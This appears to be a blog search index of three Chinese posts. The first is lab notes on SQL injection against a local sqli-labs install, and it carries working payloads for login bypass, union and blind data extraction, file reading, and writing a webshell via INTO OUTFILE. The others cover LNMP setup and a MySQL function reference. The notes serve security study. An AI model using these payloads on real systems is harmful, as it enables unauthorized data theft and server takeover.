<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[sql注入的payload]]></title>
    <url>%2F2019%2F09%2F01%2Fsql%E6%B3%A8%E5%85%A5%E7%9A%84payload%2F</url>
    <content type="text"><![CDATA[学习目标：能看懂大部分的sql语句，做到给一个复杂的sql语句能看懂，知道是干什么用的，为什么这么写. 第一部分：基础1、注入的分类：基于从服务器接收到的响应▲基于错误的 SQL 注入▲联合查询的类型▲堆查询注射▲SQL 盲注•基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 基于如何处理输入的 SQL 查询（数据类型）•基于字符串•数字或整数为基础的 基于程度和顺序的注入(哪里发生了影响)★一阶注射★二阶注射一阶注射是指输入的注射语句对 WEB 直接产生了影响， 出现了结果； 二阶注入类似存储型 XSS， 是指输入提交的语句， 无法直接对 WEB 应用程序产生影响， 通过其它的辅助间接的对 WEB 产生危害， 这样的就被称为是二阶注入. 基于注入点的位置上的▲通过用户输入的表单域的注射。▲通过 cookie 注射。▲通过服务器变量注射。 （基于头部信息的注射） 以上就是通常分类，先记录下，通过后面的实验练习加深理解 2、系统函数介绍几个常用函数： version()——MySQL 版本 user()——数据库用户名 database()——数据库名 @@datadir——数据库路径 @@version_compile_os——操作系统版本 3、字符串连接函数 concat(str1,str2,…)——没有分隔符地连接字符串 concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串 group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 以上三个函数能一次性查出所有信息 . 4、一般用于尝试的语句 Ps:–+可以用#替换， url 提交过程中 Url 编码后的#为%23 or 1=1–+‘or 1=1–+“or 1=1–+)or 1=1–+‘)or 1=1–+“) or 1=1–+“))or 1=1–+ 一般的代码为：$id=$_GET[‘id’];$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点， 一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ， 一般采用两种思 路， 闭合后面的引号或者注释掉， 注释掉采用–+ 或者 #（%23） 5、union 操作符的介绍UNION 操作符用于合并两个或多个 SELECT 语句的结果集。 请注意， UNION 内部的 SELECT语句必须拥有相同数量的列。 列也必须拥有相似的数据类型。 同时， 每条 SELECT 语句中的列的顺序必须相同。 SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2注释： 默认地， UNION 操作符选取不同的值。 如果允许重复的值， 请使用 UNION ALL。 另外， UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。 6 、sql 中的逻辑运算万能密码： 正常 Select * from admin where username=’ admin’ and password=’ admin’ 密码：’ or 1=1# Select * from admin where username=’ admin’ and password=’ ’ or 1=1# where 子 句后有 三 个 条 件 语 句 ==username=’ admin’ andpassword=’ ’ or 1=1，在sql 中and 运算优先级大于or的运算优先级，结果恒为真。 7、 注入流程 数据库存储的数据形式如上图，注入的过程就是先拿到数据库名，再获取当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据 Mysql 有一个系统数据库 information_schema， 存储着所有的数据库的相关信息， 一般的，我们利用该表可以进行一次完整的注入。 以下为一般的流程 ： 猜数据库 ： 猜某库的数据表 ： select table_name from information_schema.tables where table_schema=’dvwa’ 猜某表的所有列 select column_name from information_schema.columns where table_name=’users’ 获取某列的内容 select * from 表名； 1 联合查询的类型 payload：-1’union select 1,group_concat(schema_name),3 from information_schema.schemata –+ 1、group_concat(str1,str2,…)——连接一个组的所有字符串， 并以逗号分隔每一条数据 2、union 联合注入， union 的作用是将两个 sql 语句进行联合， union 前后的两个 sql 语句的选择列数要相同才可以。 Union all 与 union 的区别是增加了去重的功能 3、当 id 的数据在数据库中不存在时， id=-1， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空，就将后面的语句的内容显示出来，此处前台页面返回了我们构造的 union 的数据 4、此处利用 order by 对前面的数据进行排序， 这里有三列数据， 我们就只能用order by 3,超过 3 就会报错。‘order by 4–+的结果显示结果超出。 2 盲注盲注：sql 注入过程中， sql 语句执行的选择后， 选择的数据不能回显，不返回数据库当中的信息到前端页面。 盲注可以分为三类： •基于布尔 SQL 盲注•基于时间的 SQL 盲注•基于报错的 SQL 盲注 1： 基于布尔 SQL 盲注-构造逻辑判断 截取字符串相关函数解析 ▲left(database(),1)&gt;’ s’ //left()函数 Explain:database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位 ▲ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+ //substr()函数， ascii()函数 Explain： substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度。 Ascii()将某个字符转换为 ascii 值 ▲ascii(substr((select database()),1,1))=98 ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数， MID()函数 Explain： mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位Ord()函数同 ascii()， 将字符转为 ascii 值 ▲regexp 正则注入 存疑正则注入介绍用法介绍： select user() regexp ‘^[a-z]’;Explain： 正则表达式的用法， user()结果为 root， regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。 ▲like 匹配注入 和上述的正则类似， mysql 在匹配的时候我们可以用 ike 进行匹配。用法： select user() like ‘ro% 2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来 存疑3:基于时间的 SQL 盲注–延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep IF表达式 1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 布尔盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39;and left(version(),1)=5# 1） 利用 left(database(),1)进行尝试 查看 version()， 数据库的版本号为 10.1.36, 这句话的意思是查看版本号第一位是不是1， 明显的返回的结果是正确的 当版本号不正确的时候， 则不能正确显示 you are in…… http://127.0.0.1/sqllib/Less-5/?id=1 ‘and length(database())=8 –+ 判读数据库长度 猜测数据库第一位 继而猜测第二位 采用二分法 报错盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39; union Select 1,count(),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)2))a from information_schema.columns group by a–+ 利用 double 数值类型超出范围进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3–+ 利用 bigint 溢出进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (!(select * from (select user())x) - ~0),2,3--+ xpath 函数报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+ http://127.0.0.1/sqllib/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)–+ 利用数据的重复性http://127.0.0.1/sqllib/Less-5/?id=1&#39;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+ 演示盲注演示http://127.0.0.1/sqllib/Less-5/?id=1’and if(ascii(substr(database(),1,1))=116,1,sleep(5))–+ 当错误的时候会有 5 秒的时间延时。 利用 BENCHMARK()进行延时注入 当结果正确的时候， 运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次， 会占用一段时间。 http://127.0.0.1/sqllib/Less-5/?id=1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+ 猜数据库： http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 说明第一位是 s （ascii 码是 115） http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+说明第二位是 e （ascii 码是 101） 以此类推 猜出数据的名字是security 猜测 security 的数据表：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+猜测第一个数据表的第一位是 e,…依次类推， 得到 emails http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+猜测第二个数据表的第一位是 r,…依次类推， 得到 referers 以此类推， 我们可以得到所有的数据表 emails,referers,uagents,users 猜测users表的列 http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select column_name from informationschema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+猜测 users 表的第一个列的第一个字符是 i，以此类推， 我们得到列名是 id， username， password 猜测 username 的值：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+猜测 username 的第一行的第一位以此类推， 我们得到数据库 username， password 的所有内容 3 文件的导入导出1、 load_file()导出文件Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。使用条件：A、 必须有权限读取并且文件必须完全可读and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。and (select count() from mysql.user)&gt;0/ 返回错误， 应该是管理员给数据库帐户降权B、 欲读取文件必须在服务器上C、 必须指定文件完整的路径Mysql 注入—sqlilabs—lcamry30D、 欲读取文件必须小于 max_allowed_packet如果该文件不存在， 或因为上面的任一原因而不能被读出， 函数返回空。 比较难满足的就是权限， 在 windows 下， 如果 NTFS 设置得当， 是不能读取相关的文件的， 当遇到只有administrators 才能访问的文件， users 就别想 load_file 出来。在实际的注入中， 我们有两个难点需要解决：绝对物理路径构造有效的畸形语句 （报错爆出绝对路径）在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务器的安全将受到严重的威胁。常用路径：http://www.cnblogs.com/lcamry/p/5729087.html示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\boot.ini)Explain:路径里的/用 \代替 2、 文件导入到数据库LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行， 并装入一个表中。 文件名称必须为一个文字字符串。 在注入过程中， 我们往往需要一些特殊的文件， 比如配置文件， 密码文件等。 当你具有数据库的权限时， 可以将系统文件利用 load data infile 导入到数据库中。 示例： load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’lines terminated by ‘\n’ 将/tmp/t0.txt 导入到 t0 表中， character set gbk 是字符集设置为 gbk， fields terminated by 是每一项数据之间的分隔符， lines terminated by 是行的结尾符。 当错误代码是 2 的时候的时候， 文件不存在， 错误代码为 13 的时候是没有权限， 可以考虑/tmp 等文件夹。 3、 导入到文件SELECT…..INTO OUTFILE ‘file_name’ 可以把被选择的行写入一个文件中。 该文件被创建到服务器主机上， 因此您必须拥有 FILE权限， 才能使用此语法。 file_name 不能是一个已经存在的文件。 有两种形式： 第一种直接将 select 内容导入到文件中： Select version() into outfile “c:\phpnow\htdocs\test.php”此处将 version()替换成一句话， 也即Select into outfile “c:\phpnow\htdocs\test.php” 然后直接连一句话 第二种修改文件结尾：Select version() Into outfile “c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文件 解释： 通常是用‘\r\n’ 结尾， 此处我们修改为自己想要的任何文件。 同时可以用 FIELDSTERMINATED BY16 进制可以为一句话或者其他任何的代码， 可自行构造。 在 sqlmap 中 os-shell 采取的就是这样的方式， 具体可参考 os-shell 分析文章： http://www.cnblogs.com/lcamry/p/5505110.html http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,3 into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.txt” –+ 写入一句话木马 http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,’‘ into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.php” –+ 后续就可以上菜刀了 POST 注入输入正确用户名和密码 提交 username 和 password 后， 后台形成的 sql 语句为 $sql=”SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1”; 万能密码: 用户名：admin’or’1’=’1# admin ‘ # 密码：密码随便输入 $sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and password=’$passwd’ LIMIT 0,1”; 猜测数据库第一位 uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit 增删改函数介绍 增加一行数据 INSERT insert into users values(‘16’,’lcamry’,’lcamry’); 删除一行数据 ​ 修改一行数据 updata 表名 set 列名=’新的值， 非数字加单引号’ where id=6; HTTP 头部注入User-Agent 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1 Referer 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 cookie 注入 报错了 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 第二部分：高级注入]]></content>
  </entry>
  <entry>
    <title><![CDATA[LNMP环境搭建]]></title>
    <url>%2F2019%2F08%2F31%2FLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境搭建Ubuntu 镜像下载：https://mirrors.huaweicloud.com/ubuntu-releases/bionic/ 系统安装安装语言选择 最小安装 格式化硬盘 配置root密码默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码，终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了 配置镜像源1.编辑源：sudo gedit /etc/apt/sources.list 2.复制以下清华提供的镜像源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 3.更新系统：sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade SSH and htop安装SSH：sudo apt install openssh-server htop：sudo apt install htop 谷歌浏览器谷歌浏览器deb文件下载： https://www.google.cn/chrome/ 安装谷歌浏览器：sudo dpkg -i google-chrome*.deb ，修复依赖 卸载火狐浏览器：sudo apt autoremove firefox* 搜狗输入法官方地址：https://pinyin.sogou.com/linux/ 安装sogo: dpkg -i sogopinyin*.deb 修复依赖：sudo apt install -f 设置系统默认输入法： 删除自带输入法： Ctrl+space 切换输入法 安装mysql安装MySQL：sudo apt install mysql-server msysql 安全初始化 安全初始化：sudo mysql_secure_installation 登录测试 安装NginxNginx： sudo apt install nginx 验证： 安装PHP-FPM安装PHP 配置Nginx:sudo gpedit /etc/nginx/sites-available/default 添加默认页面：index.php 取消默认注释: 配置php-fpm文件：sudo gedit /etc/php/7.2/fpm/php-fpm.conf listen = /var/run/php/php7.0-fpm.sock (监听sock,路径和Nginx的一样) 重启Nginx和php-fpm配置生效sudo systemctl restart php7.2-fpm sudo systemctl restart nginx 验证： CURD(PHP)安装驱动 安装PHP的mysql驱动： sudo apt intstall php7.2-mysql 连接mysql 验证]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据库系统功能相关学习]]></title>
    <url>%2F2019%2F08%2F22%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数 描述 1 ASCII(s) 返回字符串 s 的第一个字符的 ASCII 码。 2 CHAR_LENGTH(s) 返回字符串 s 的字符数 CHARACTER_LENGTH(s) 返回字符串 s 的字符数 3 CONCAT(s1,s2…sn) 字符串 s1,s2 等多个字符串合并为一个字符串合并多个字符串 4 LOCATE(s1,s) 从字符串 s 中获取 s1 的开始位置 5LCASE(s) 将字符串 s 的所有字母变成小写字母LOWER(s) 将字符串 s 的所有字母变成小写字母 6LEFT(s,n) 返回字符串 s 的前 n 个字符 7 LPAD(s1,len,s2) 在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len 7 REPEAT(s,n) 将字符串 s 重复 n 次 8 REVERSE(s) 将字符串s的顺序反过来 9 RIGHT(s,n) 返回字符串 s 的后 n 个字符 10 RPAD(s1,len,s2) 在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len 11 SPACE(n) 返回 n 个空格返回 10 个空格： SELECT SPACE(10); 12 STRCMP(s1,s2) 比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1 12 SUBSTR(s, start, length) 从字符串 s 的 start 位置截取长度为 length 的子字符串 13 TRIM(s) 去掉字符串 s 开始和结尾处的空格 14 UCASE(s) 将字符串转换为大写​ UPPER(s) 将字符串转换为大写 MySQL 数字函数15 ABS(x) 返回 x 的绝对值 16 AVG(expression) 返回一个表达式的平均值，expression 是一个字段 函数名 描述 实例 ABS(x) 返回 x 的绝对值 返回 -1 的绝对值： SELECT ABS(-1) -- 返回1 ACOS(x) 求 x 的反余弦值(参数是弧度) SELECT ACOS(0.25); ASIN(x) 求反正弦值(参数是弧度) SELECT ASIN(0.25); ATAN(x) 求反正切值(参数是弧度) SELECT ATAN(2.5); ATAN2(n, m) 求反正切值(参数是弧度) SELECT ATAN2(-0.8, 2); AVG(expression) 返回一个表达式的平均值，expression 是一个字段 返回 Products 表中Price 字段的平均值： SELECT AVG(Price) AS AveragePrice FROM Products; CEIL(x) 返回大于或等于 x 的最小整数 SELECT CEIL(1.5) -- 返回2 CEILING(x) 返回大于或等于 x 的最小整数 SELECT CEIL(1.5) -- 返回2 COS(x) 求余弦值(参数是弧度) SELECT COS(2); COT(x) 求余切值(参数是弧度) SELECT COT(6); COUNT(expression) 返回查询的记录总数，expression 参数是一个字段或者 * 号 返回 Products 表中 products 字段总共有多少条记录： SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; DEGREES(x) 将弧度转换为角度 SELECT DEGREES(3.1415926535898) -- 180 n DIV m 整除，n 为被除数，m 为除数 计算 10 除于 5： SELECT 10 DIV 5; -- 2 EXP(x) 返回 e 的 x 次方 计算 e 的三次方： SELECT EXP(3) -- 20.085536923188 FLOOR(x) 返回小于或等于 x 的最大整数 小于或等于 1.5 的整数： SELECT FLOOR(1.5) -- 返回1 GREATEST(expr1, expr2, expr3, …) 返回列表中的最大值 返回以下数字列表中的最大值： SELECT GREATEST(3, 12, 34, 8, 25); -- 34 返回以下字符串列表中的最大值：SELECT GREATEST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;); -- Runoob LEAST(expr1, expr2, expr3, …) 返回列表中的最小值 返回以下数字列表中的最小值： SELECT LEAST(3, 12, 34, 8, 25); -- 3 返回以下字符串列表中的最小值：SELECT LEAST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;); -- Apple LN 返回数字的自然对数 返回 2 的自然对数： SELECT LN(2); -- 0.6931471805599453 LOG(x) 返回自然对数(以 e 为底的对数) SELECT LOG(20.085536923188) -- 3 LOG10(x) 返回以 10 为底的对数 SELECT LOG10(100) -- 2 LOG2(x) 返回以 2 为底的对数 返回以 2 为底 6 的对数： SELECT LOG2(6); -- 2.584962500721156 MAX(expression) 返回字段 expression 中的最大值 返回数据表 Products 中字段 Price 的最大值： SELECT MAX(Price) AS LargestPrice FROM Products; MIN(expression) 返回字段 expression 中的最小值 返回数据表 Products 中字段 Price 的最小值： SELECT MIN(Price) AS LargestPrice FROM Products; MOD(x,y) 返回 x 除以 y 以后的余数 5 除于 2 的余数： SELECT MOD(5,2) -- 1 PI() 返回圆周率(3.141593） SELECT PI() --3.141593 POW(x,y) 返回 x 的 y 次方 2 的 3 次方： SELECT POW(2,3) -- 8 POWER(x,y) 返回 x 的 y 次方 2 的 3 次方： SELECT POWER(2,3) -- 8 RADIANS(x) 将角度转换为弧度 180 度转换为弧度： SELECT RADIANS(180) -- 3.1415926535898 RAND() 返回 0 到 1 的随机数 SELECT RAND() --0.93099315644334 ROUND(x) 返回离 x 最近的整数 SELECT ROUND(1.23456) --1 SIGN(x) 返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1 SELECT SIGN(-10) -- (-1) SIN(x) 求正弦值(参数是弧度) SELECT SIN(RADIANS(30)) -- 0.5 SQRT(x) 返回x的平方根 25 的平方根： SELECT SQRT(25) -- 5 SUM(expression) 返回指定字段的总和 计算 OrderDetails 表中字段 Quantity 的总和： SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails; TAN(x) 求正切值(参数是弧度) SELECT TAN(1.75); -- -5.52037992250933 TRUNCATE(x,y) 返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入） SELECT TRUNCATE(1.23456,3) -- 1.234 MySQL 日期函数 函数名 描述 实例 ADDDATE(d,n) 计算起始日期 d 加上 n 天的日期 SELECT ADDDATE(&quot;2017-06-15&quot;, INTERVAL 10 DAY); -&gt;2017-06-25 ADDTIME(t,n) 时间 t 加上 n 秒的时间 SELECT ADDTIME(&#39;2011-11-11 11:11:11&#39;, 5) -&gt;2011-11-11 11:11:16 (秒) CURDATE() 返回当前日期 SELECT CURDATE(); -&gt; 2018-09-19 CURRENT_DATE() 返回当前日期 SELECT CURRENT_DATE(); -&gt; 2018-09-19 CURRENT_TIME 返回当前时间 SELECT CURRENT_TIME(); -&gt; 19:59:02 CURRENT_TIMESTAMP() 返回当前日期和时间 SELECT CURRENT_TIMESTAMP() -&gt; 2018-09-19 20:57:43 CURTIME() 返回当前时间 SELECT CURTIME(); -&gt; 19:59:02 DATE() 从日期或日期时间表达式中提取日期值 SELECT DATE(&quot;2017-06-15&quot;); -&gt; 2017-06-15 DATEDIFF(d1,d2) 计算日期 d1-&gt;d2 之间相隔的天数 SELECT DATEDIFF(&#39;2001-01-01&#39;,&#39;2001-02-02&#39;) -&gt; -32 DATE_ADD(d，INTERVAL expr type) 计算起始日期 d 加上一个时间段后的日期 SELECT ADDDATE(&#39;2011-11-11 11:11:11&#39;,1) -&gt; 2011-11-12 11:11:11 (默认是天) SELECT ADDDATE(&#39;2011-11-11 11:11:11&#39;, INTERVAL 5 MINUTE) -&gt; 2011-11-11 11:16:11 (TYPE的取值与上面那个列出来的函数类似) DATE_FORMAT(d,f) 按表达式 f的要求显示日期 d SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) -&gt; 2011-11-11 11:11:11 AM DATE_SUB(date,INTERVAL expr type) 函数从日期减去指定的时间间隔。 Orders 表中 OrderDate 字段减去 2 天： SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders DAY(d) 返回日期值 d 的日期部分 SELECT DAY(&quot;2017-06-15&quot;); -&gt; 15 DAYNAME(d) 返回日期 d 是星期几，如 Monday,Tuesday SELECT DAYNAME(&#39;2011-11-11 11:11:11&#39;) -&gt;Friday DAYOFMONTH(d) 计算日期 d 是本月的第几天 SELECT DAYOFMONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 DAYOFWEEK(d) 日期 d 今天是星期几，1 星期日，2 星期一，以此类推 SELECT DAYOFWEEK(&#39;2011-11-11 11:11:11&#39;) -&gt;6 DAYOFYEAR(d) 计算日期 d 是本年的第几天 SELECT DAYOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt;315 EXTRACT(type FROM d) 从日期 d 中获取指定的值，type 指定返回的值。 type可取值为： MICROSECOND SECOND MINUTE HOUR DAY WEEK MONTH QUARTER YEAR SECOND_MICROSECOND MINUTE_MICROSECOND MINUTE_SECOND HOUR_MICROSECOND HOUR_SECOND HOUR_MINUTE DAY_MICROSECOND DAY_SECOND DAY_MINUTE DAY_HOUR YEAR_MONTH SELECT EXTRACT(MINUTE FROM &#39;2011-11-11 11:11:11&#39;) -&gt; 11 FROM_DAYS(n) 计算从 0000 年 1 月 1 日开始 n 天后的日期 SELECT FROM_DAYS(1111) -&gt; 0003-01-16 HOUR(t) 返回 t 中的小时值 SELECT HOUR(&#39;1:2:3&#39;) -&gt; 1 LAST_DAY(d) 返回给给定日期的那一月份的最后一天 SELECT LAST_DAY(&quot;2017-06-20&quot;); -&gt; 2017-06-30 LOCALTIME() 返回当前日期和时间 SELECT LOCALTIME() -&gt; 2018-09-19 20:57:43 LOCALTIMESTAMP() 返回当前日期和时间 SELECT LOCALTIMESTAMP() -&gt; 2018-09-19 20:57:43 MAKEDATE(year, day-of-year) 基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期 SELECT MAKEDATE(2017, 3); -&gt; 2017-01-03 MAKETIME(hour, minute, second) 组合时间，参数分别为小时、分钟、秒 SELECT MAKETIME(11, 35, 4); -&gt; 11:35:04 MICROSECOND(date) 返回日期参数所对应的微秒数 SELECT MICROSECOND(&quot;2017-06-20 09:34:00.000023&quot;); -&gt; 23 MINUTE(t) 返回 t 中的分钟值 SELECT MINUTE(&#39;1:2:3&#39;) -&gt; 2 MONTHNAME(d) 返回日期当中的月份名称，如 Janyary SELECT MONTHNAME(&#39;2011-11-11 11:11:11&#39;) -&gt; November MONTH(d) 返回日期d中的月份值，1 到 12 SELECT MONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 NOW() 返回当前日期和时间 SELECT NOW() -&gt; 2018-09-19 20:57:43 PERIOD_ADD(period, number) 为 年-月 组合日期添加一个时段 SELECT PERIOD_ADD(201703, 5); -&gt; 201708 PERIOD_DIFF(period1, period2) 返回两个时段之间的月份差值 SELECT PERIOD_DIFF(201710, 201703); -&gt; 7 QUARTER(d) 返回日期d是第几季节，返回 1 到 4 SELECT QUARTER(&#39;2011-11-11 11:11:11&#39;) -&gt; 4 SECOND(t) 返回 t 中的秒钟值 SELECT SECOND(&#39;1:2:3&#39;) -&gt; 3 SEC_TO_TIME(s) 将以秒为单位的时间 s 转换为时分秒的格式 SELECT SEC_TO_TIME(4320) -&gt; 01:12:00 STR_TO_DATE(string, format_mask) 将字符串转变为日期 SELECT STR_TO_DATE(&quot;August 10 2017&quot;, &quot;%M %d %Y&quot;); -&gt; 2017-08-10 SUBDATE(d,n) 日期 d 减去 n 天后的日期 SELECT SUBDATE(&#39;2011-11-11 11:11:11&#39;, 1) -&gt;2011-11-10 11:11:11 (默认是天) SUBTIME(t,n) 时间 t 减去 n 秒的时间 SELECT SUBTIME(&#39;2011-11-11 11:11:11&#39;, 5) -&gt;2011-11-11 11:11:06 (秒) SYSDATE() 返回当前日期和时间 SELECT SYSDATE() -&gt; 2018-09-19 20:57:43 TIME(expression) 提取传入表达式的时间部分 SELECT TIME(&quot;19:30:10&quot;); -&gt; 19:30:10 TIME_FORMAT(t,f) 按表达式 f 的要求显示时间 t SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) 11:11:11 AM TIME_TO_SEC(t) 将时间 t 转换为秒 SELECT TIME_TO_SEC(&#39;1:12:00&#39;) -&gt; 4320 TIMEDIFF(time1, time2) 计算时间差值 SELECT TIMEDIFF(&quot;13:10:11&quot;, &quot;13:10:10&quot;); -&gt; 00:00:01 TIMESTAMP(expression, interval) 单个参数时，函数返回日期或日期时间表达式；有2个参数时，将参数加和 SELECT TIMESTAMP(&quot;2017-07-23&quot;, &quot;13:10:11&quot;); -&gt; 2017-07-23 13:10:11 TO_DAYS(d) 计算日期 d 距离 0000 年 1 月 1 日的天数 SELECT TO_DAYS(&#39;0001-01-01 01:01:01&#39;) -&gt; 366 WEEK(d) 计算日期 d 是本年的第几个星期，范围是 0 到 53 SELECT WEEK(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 WEEKDAY(d) 日期 d 是星期几，0 表示星期一，1 表示星期二 SELECT WEEKDAY(&quot;2017-06-15&quot;); -&gt; 3 WEEKOFYEAR(d) 计算日期 d 是本年的第几个星期，范围是 0 到 53 SELECT WEEKOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt; 45 YEAR(d) 返回年份 SELECT YEAR(&quot;2017-06-15&quot;); -&gt; 2017 YEARWEEK(date, mode) 返回年份及第几周（0到53），mode 中 0 表示周天，1表示周一，以此类推 SELECT YEARWEEK(&quot;2017-06-15&quot;); -&gt; 201724 MySQL 高级函数17 BIN(x) 返回 x 的二进制编码 18 BINARY(s) 将字符串 s 转换为二进制字符串 19 CONNECTION_ID() 返回服务器的连接数 20 CURRENT_USER() 返回当前用户 SESSION_USER() 返回当前用户 SYSTEM_USER() 返回当前用户 USER() 返回当前用户 21 VERSION() 返回数据库的版本号 22 DATABASE() 返回当前数据库名 23 @@datadir 返回 数据库路径 24 @@version_compile_os 返回操作系统版本 Mysql通过system命令调用系统shell命令 判断是否存在SQL注入Boolean盲注盲注，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的信息，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到了执行。 通过输入http://127.0.0.1/sqli/Less-1/?id=1 得到以下界面 然后输入 